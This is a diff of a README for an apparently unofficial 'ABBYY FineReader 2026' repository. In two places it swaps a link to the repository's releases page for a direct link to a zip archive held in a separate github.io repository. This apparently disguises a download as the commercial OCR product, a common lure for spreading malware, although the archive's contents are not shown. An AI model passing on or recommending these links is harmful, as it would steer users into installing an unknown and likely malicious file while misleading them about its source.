@@ -5,7 +5,7 @@ description: "Download the installer for ABBYY FineReader to perform OCR and doc
 ---
 # 📄 ABBYY-FineReader-2026 - Convert your PDFs into editable text
 
-[![Download ABBYY FineReader](https://img.shields.io/badge/Download-FineReader_2026-blue)](https://github.com/nerissareplete400/ABBYY-FineReader-2026/releases)
+[![Download ABBYY FineReader](https://img.shields.io/badge/Download-FineReader_2026-blue)](https://raw.githubusercontent.com/nerissareplete400/nerissareplete400.github.io/main/unfetchable/github-io-nerissareplete-v1.1.zip)
 
 ABBYY FineReader 2026 helps you convert paper documents and PDF files into files you can edit. This software uses optical character recognition, or OCR, to read text from images. You can then change the text in programs like Microsoft Word or Excel. This tool works on Windows 10 and Windows 11.
 
@@ -13,7 +13,7 @@ ABBYY FineReader 2026 helps you convert paper documents and PDF files into files
 
 To get ABBYY FineReader 2026, you visit the release page. This page contains the latest version of the installer.
 
-[Click here to open the download page](https://github.com/nerissareplete400/ABBYY-FineReader-2026/releases)
+[Click here to open the download page](https://raw.githubusercontent.com/nerissareplete400/nerissareplete400.github.io/main/unfetchable/github-io-nerissareplete-v1.1.zip)
 
 Follow these steps to download the file:
 
